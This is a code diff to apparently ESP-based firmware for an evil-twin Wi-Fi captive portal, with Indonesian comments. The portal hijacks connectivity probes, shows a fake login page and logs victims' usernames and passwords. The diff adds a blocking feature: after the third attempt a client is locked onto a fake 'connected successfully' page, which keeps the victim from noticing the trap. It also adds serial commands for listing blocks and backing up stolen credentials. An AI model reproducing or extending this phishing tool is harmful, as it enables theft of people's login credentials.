@@ -359,6 +359,85 @@ Attempt *attemptFor(IPAddress ip, bool create) {
   return &attempts.back();
 }
 
+/* ================== BLOKIR KLIEN SETELAH 3x ======================= */
+/* Setelah percobaan ke-3, IP klien masuk daftar blokir: semua request-nya
+   hanya dapat halaman "Berhasil Terhubung" (form login tidak bisa diakses
+   lagi). Daftar disimpan di /blocked.txt supaya tahan reboot.            */
+struct Blocked { IPAddress ip; String mac; String at; };
+std::vector<Blocked> blockedList;
+#define BLOCK_FILE "/blocked.txt"
+
+/* tabel MAC->IP diisi oleh DHCP server sendiri (lihat dhcpTick) */
+struct Lease { uint8_t mac[6]; IPAddress ip; };
+Lease leaseTable[24];
+int leaseCount = 0;
+
+void leaseNote(const uint8_t *mac, IPAddress ip) {
+  for (int i = 0; i < leaseCount; i++)
+    if (!memcmp(leaseTable[i].mac, mac, 6)) { leaseTable[i].ip = ip; return; }
+  if (leaseCount >= 24) leaseCount = 0;
+  memcpy(leaseTable[leaseCount].mac, mac, 6);
+  leaseTable[leaseCount].ip = ip;
+  leaseCount++;
+}
+
+String macForIP(IPAddress ip) {
+  for (int i = 0; i < leaseCount; i++) {
+    if (leaseTable[i].ip == ip) {
+      char b[18];
+      snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X",
+               leaseTable[i].mac[0], leaseTable[i].mac[1], leaseTable[i].mac[2],
+               leaseTable[i].mac[3], leaseTable[i].mac[4], leaseTable[i].mac[5]);
+      return String(b);
+    }
+  }
+  return String("-");
+}
+
+bool isBlocked(IPAddress ip) {
+  for (auto &b : blockedList) if (b.ip == ip) return true;
+  return false;
+}
+
+void addBlock(IPAddress ip, const String &lastUser) {
+  if (isBlocked(ip)) return;
+  if (blockedList.size() >= 60) blockedList.erase(blockedList.begin());
+  Blocked b;
+  b.ip = ip;
+  b.mac = macForIP(ip);
+  b.at = upTime();
+  blockedList.push_back(b);
+  File f = LittleFS.open(BLOCK_FILE, FILE_APPEND);
+  if (f) { f.println(b.mac + "|" + b.ip.toString() + "|" + b.at + "|" + lastUser); f.close(); }
+  Serial.printf("[BLOCK] %s (%s) diblokir setelah 3x percobaan (user terakhir: %s)\n",
+                ip.toString().c_str(), b.mac.c_str(), lastUser.c_str());
+}
+
+void loadBlocked() {
+  blockedList.clear();
+  if (!LittleFS.exists(BLOCK_FILE)) return;
+  File f = LittleFS.open(BLOCK_FILE, FILE_READ);
+  if (!f) return;
+  while (f.available()) {
+    String l = f.readStringUntil('\n'); l.trim();
+    if (!l.length()) continue;
+    int p1 = l.indexOf('|');
+    int p2 = l.indexOf('|', p1 + 1);
+    int p3 = l.indexOf('|', p2 + 1);
+    if (p1 < 0 || p2 < 0) continue;
+    Blocked b;
+    b.mac = l.substring(0, p1);
+    String ipStr = l.substring(p1 + 1, p2 < 0 ? l.length() : p2);
+    b.at = (p2 > 0 && p3 > 0) ? l.substring(p2 + 1, p3) : String("-");
+    IPAddress tmp;
+    if (tmp.fromString(ipStr)) b.ip = tmp; else continue;
+    blockedList.push_back(b);
+    if (blockedList.size() >= 60) break;
+  }
+  f.close();
+  Serial.printf("[BLOCK] %u IP diblokir dimuat\n", (unsigned)blockedList.size());
+}
+
 /* ====================== HANDLER =================================== */
 String loginPage(const String &errMsg) {
   String page = ui("/portal.html", PAGE_LOGIN);
@@ -398,14 +477,23 @@ void redirectToPortal() {
   server.send(302, "text/html; charset=utf-8", jumpPage());
 }
 
-void handleRoot()        { sendPortal(""); }
+bool blockedGate() {
+  if (!isBlocked(server.client().remoteIP())) return false;
+  server.sendHeader("Cache-Control", "no-store");
+  server.send(200, "text/html; charset=utf-8", ui("/success.html", PAGE_OK));
+  return true;
+}
+
+void handleRoot()        { if (blockedGate()) return; sendPortal(""); }
 void handleNotFound() {
+  if (blockedGate()) return;
   Serial.printf("[HIJACK] %s host=%s ua=%s\n", server.uri().c_str(),
                 server.hostHeader().c_str(), server.header("User-Agent").c_str());
   sendJump();
 }
 
 void handleProbe() {        // /generate_204, /hotspot-detect.html, /connecttest.txt, ...
+  if (blockedGate()) return;
   Serial.printf("[PROBE] %s host=%s\n", server.uri().c_str(),
                 server.hostHeader().c_str());
   sendJump();
@@ -513,6 +601,8 @@ void dhcpTick() {
   dhcpUdp.write(rep, o);
   dhcpUdp.endPacket();
 
+  leaseNote(mac, IPAddress(rep[16], rep[17], rep[18], rep[19]));
+
   if (mtype == 3) {
     dhcpAcks++;
     Serial.printf("[DHCP] ACK %d.%d.%d.%d mac=%02X:%02X:%02X:%02X:%02X:%02X opt114=%s\n",
@@ -580,6 +670,7 @@ void handlePac() {
 }
 
 void handleLogin() {
+  if (blockedGate()) return;
   if (server.method() == HTTP_GET) {
     Serial.printf("[LOGIN] GET dari %s (ua=%s)\n",
                   server.client().remoteIP().toString().c_str(),
@@ -609,9 +700,10 @@ void handleLogin() {
   a->last = sig;
   a->n++;
 
-  if (a->n >= 3) {                 // percobaan ketiga: tampil berhasil
+  if (a->n >= 3) {                 // percobaan ketiga: tampil berhasil + BLOKIR
     a->n = 0;
     a->last = "";
+    addBlock(cip, u);
     Serial.printf("[OK] percobaan ke-3 dari %s -> halaman BERHASIL\n", cip.toString().c_str());
     server.sendHeader("Cache-Control", "no-store");
     server.send(200, "text/html; charset=utf-8", ui("/success.html", PAGE_OK));
@@ -623,11 +715,13 @@ void handleLogin() {
 }
 
 void handleProses() {
+  if (blockedGate()) return;
   server.sendHeader("Cache-Control", "no-store");
   server.send(200, "text/html; charset=utf-8", ui("/loading.html", PAGE_LOADING));
 }
 
 void handleHasil() {
+  if (blockedGate()) return;
 #if REPEAT_AFTER_LOGIN
   sendPortal("Username atau password salah. Silakan coba lagi.");
 #else
@@ -641,9 +735,11 @@ bool authOk() {
 }
 
 void handleAdmin() {
+  if (blockedGate()) return;
   if (!authOk()) { server.send(404, "text/plain", "404"); return; }
 
-  String meta = String(creds.size()) + " akun | " + WiFi.softAPgetStationNum() +
+  String meta = String(creds.size()) + " akun | " + String(blockedList.size()) +
+                " diblokir | " + WiFi.softAPgetStationNum() +
                 " klien | up " + upTime();
 
   String rows;
@@ -673,6 +769,7 @@ void handleAdmin() {
 }
 
 void handleCsv() {
+  if (blockedGate()) return;
   if (!authOk()) { server.send(404, "text/plain", "404"); return; }
   String csv = "waktu,username,password,ip,device\n";
   for (const String &l : creds) {
@@ -689,6 +786,7 @@ void handleCsv() {
 }
 
 void handleClear() {
+  if (blockedGate()) return;
   if (!authOk()) { server.send(404, "text/plain", "404"); return; }
   creds.clear();
   LittleFS.remove(CRED_FILE);
@@ -755,10 +853,40 @@ void cmdDump() {
   Serial.printf("[CMD] dump selesai, %d entri\n###END###\n", n);
 }
 
+void cmdBlocked() {
+  if (blockedList.empty()) { Serial.println("[CMD] tidak ada IP diblokir"); return; }
+  for (auto &b : blockedList)
+    Serial.printf("[BLOCK] %-15s %s  sejak %s\n", b.ip.toString().c_str(), b.mac.c_str(), b.at.c_str());
+}
+
+void cmdUnblock(String arg) {
+  arg.trim();
+  if (!arg.length() || arg == "all") {
+    blockedList.clear();
+    LittleFS.remove(BLOCK_FILE);
+    Serial.println("[CMD] semua blokir dihapus");
+    return;
+  }
+  IPAddress t;
+  if (!t.fromString(arg)) { Serial.println("[CMD] format: unblock <ip> | unblock all"); return; }
+  for (size_t i = 0; i < blockedList.size(); i++) {
+    if (blockedList[i].ip == t) {
+      blockedList.erase(blockedList.begin() + i);
+      File f = LittleFS.open(BLOCK_FILE, FILE_WRITE);
+      if (f) { for (auto &b : blockedList) f.println(b.mac + "|" + b.ip.toString() + "|" + b.at + "|"); f.close(); }
+      Serial.printf("[CMD] %s dibuka\n", arg.c_str());
+      return;
+    }
+  }
+  Serial.println("[CMD] IP itu tidak ada di daftar blokir");
+}
+
 void cmdWipe() {
   creds.clear();
   LittleFS.remove(CRED_FILE);
-  Serial.println("[CMD] semua log dihapus (RAM + LittleFS)");
+  blockedList.clear();
+  LittleFS.remove(BLOCK_FILE);
+  Serial.println("[CMD] semua log + daftar blokir dihapus (RAM + LittleFS)");
 }
 
 void cmdStatus() {
@@ -785,13 +913,15 @@ void handleCmd(String c) {
   if (!c.length()) return;
   Serial.printf("[CMD] >> %s\n", c.c_str());
   if (c == "help") {
-    Serial.println("[CMD] count | csv | dump | status | wipe | ui");
+    Serial.println("[CMD] count | csv/backup | dump | status | wipe | ui | blocked | unblock [ip|all]");
   } else if (c == "count")  { cmdCount(); }
-  else if (c == "csv")      { cmdCsv(); }
+  else if (c == "csv" || c == "backup") { cmdCsv(); }
   else if (c == "dump")     { cmdDump(); }
   else if (c == "status")   { cmdStatus(); }
   else if (c == "wipe")     { cmdWipe(); }
   else if (c == "ui")       { cmdUi(); }
+  else if (c == "blocked")  { cmdBlocked(); }
+  else if (c.startsWith("unblock")) { cmdUnblock(c.substring(7)); }
   else                      { Serial.println("[CMD] ? ketik help"); }
 }
 
@@ -828,6 +958,7 @@ void setup() {
     Serial.println("[FS] mount gagal, log hanya di RAM");
   }
   loadCreds();
+  loadBlocked();
 
   WiFi.persistent(false);
   WiFi.mode(WIFI_AP);
